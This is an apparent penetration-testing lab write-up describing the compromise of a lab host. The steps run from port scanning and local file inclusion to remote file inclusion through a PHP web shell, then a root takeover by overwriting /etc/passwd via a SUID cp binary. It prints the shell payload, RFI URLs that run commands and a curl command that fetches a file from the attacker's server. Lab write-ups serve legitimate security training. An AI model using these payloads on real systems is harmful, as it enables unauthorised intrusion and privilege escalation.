Report

Report

1. SYN stealth scan to find all open ports. Only ports 22 and 80 are open
`sudo nmap -p- 10.11.1.35`
![ccc28e8c125ab7a541d127421ac03257.png](3042ec856b3e462d8c912ea7957046a9.png)


2. Run an aggressive scan with service detection on ports 22 and 80 only. We see it's likely a Linux box
`sudo nmap -p22,80 -A -sV 10.11.1.35`
![a36df847e5a4dd1fc44baaaffb5a97fa.png](d915ca6ed62d4725966396c8b505732b.png)


3. Run dirb on the webserver
`dirb http://10.11.1.35`
![85cc2277a524dffb230cd9651e90346f.png](68f8c3e38b9d4a0aaefa1708c45a6e54.png)


4. Browse the landing page
`http://10.11.1.35/`
![550ff1f7910a4dc5af5a00de8c727125.png](6cd335c67ba04991a14e91184673013a.png)


5. Notice that the links direct to http://10.11.1.35/section.php?page=
![8f0240f7a0de0c82635c61d2eb4d7d81.png](fed1d9c8365542908fbd562568e2ce7b.png)


6. Test for LFI. Yes, we can display /etc/passwd. Note that root is the only user that can log in.
http://10.11.1.35/section.php?page=/etc/passwd
![6e07a9c6ba2d9c69bbecb404a430b047.png](c850c40671e645ee9841d9b4d493abaa.png)
The source code is easier to read
view-source:http://10.11.1.35/section.php?page=/etc/passwd
![a0babe25d704293c7ae29f83c0e16646.png](4d194c77cc2f48bfbeb0408509320ff1.png)


7. Put a malicious file on Kali's Apache web server that we will soon test for RFI with
```plaintext
kali@kali:/var/www/html/evil$ cat evil.txt 
<?php echo shell_exec($_GET['cmd']); ?>
```
![587f4b5028aa7c736478857fdfd27bb6.png](a0da2f83bd6e4c2494f798408e0e14f5.png)


8. Start the apache server
`sudo systemctl start apache2`
![808b5bb356f49077f9b51487620b9f34.png](c5b8363df43c4a02b88b136956965f5f.png)


9. Test RFI. Yes, we have remote execution
`http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=hostname`
![518cab5e9e6ae3e6324c7d0a8b5e9bbd.png](2b28ee505c0c4b9c822a0a4a5216acaf.png)
`http://10.11.1.35/section.php?page=/etc/passwd`
![b9ce681934a22aaeb337b8c997cad7a1.png](316f6dac27fc44f0920276c1d3d32320.png)
`view-source:http://10.11.1.35/section.php?page=/etc/passwd`
![e9804f61e4e22288689df135242c3abe.png](4a4a4d8ce447401eae8a3076dd173380.png)


10. Look for SUID binaries. The first binary we found is the copy (cp) command
`http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=find+/+-perm+/4000`
![9c1822edf8361e7eccedec77f4dee651.png](9b9801a50f6f40a3a536700fc52ea595.png)
The source is easier to read.
`view-source:http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=find+/+-perm+/4000`
![6b511c9b5945b18cc486c1655b89f34c.png](a8a796aa593244658d95dc2d018cce23.png)


11. Copy the /etc/passwd (remember we can view from LFI)
![13e6ecce41f88f3a49146c0fada26198.png](e8898479958141159224c3ee4f89d152.png)

Let's work with a copy of it on Kali using any text editor. In this case we used 'Simple Text Editor' We can copy the first line (the root user) and paste it to the bottom of the file and rename the user as 'cb'.
![135fa60585927e83c677309b34286b5c.png](1cf704249a134f619ab20fd12a6b2fd7.png)


12. Create a salt value of password for our new user and this will be done using "openssl". We will get a hash value
```plaintext
kali@kali:~$ openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```
![618892b0ae1819b53c3431311d087f0d.png](88d365ff966242aaaef6038ed92846ec.png)


13. On Kali, replace the password of the 'cb' user with the openssl hash.
![74a444e4a7bf9a07bf1337fd30dde6b9.png](bd5f87d95cd747cfab21f5a0db085e81.png)


14. Save the modified passwd file to /home/kali and name it 'passwd'
![061fd3fd3c1f2735ef855fcf05a19579.png](0ff5f350993a44709e82bcf79e4dc39a.png)


15. View the contents of /home/kali/passwd
`cat /home/kali/passwd`
![45910c295bdfbc884bf315298b22e3a9.png](b660a8a9911e4078a0be85f1f4d9838a.png)


16. Start a python server in the /home/kali directory
`python -m SimpleHTTPServer`
![642524723a5026fb5d41f50660a149f7.png](fc9e1a4e2e6246ca81876f8669398ed7.png)


17. Copy the modified passwd file from Kali to pain's /tmp directory
`http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=curl+http://192.168.119.214:8000/passwd+-o+/tmp/passwd`
![b78812fd77e7df48e14abaeb4d69cf60.png](8c1099723dd24980a2839c11e27b97ea.png)
We can see the request was successful
![f91c3b421771bdf19d8c3c6b49ece6f9.png](524395c0500f4039b566e4b26cd72610.png)


18. Restart the ssh server
`http://10.11.1.35/section.php?page=http://192.168.119.214/evil/evil.txt&cmd=/usr/bin/cp+-b+--no-preserve=mode,ownership+/tmp/passwd+/etc/passwd+&&+service+sshd+restart`
![f9fa4944aa4ba246fa5359f6567b54ef.png](ffd9b18001d545f897b1d317be346a45.png)
![14b8d3ad91876f486ffd930dfcf42433.png](34f8f26207a34867bfe16b2175172020.png)


19. SSH as user cb
`whoami`
`ip addr`
`cat /root/proof.txt`
![3edbad4929616f8d810678b15f0e7a9c.png](230dd047be5d48b88f1da40f21ea7408.png)











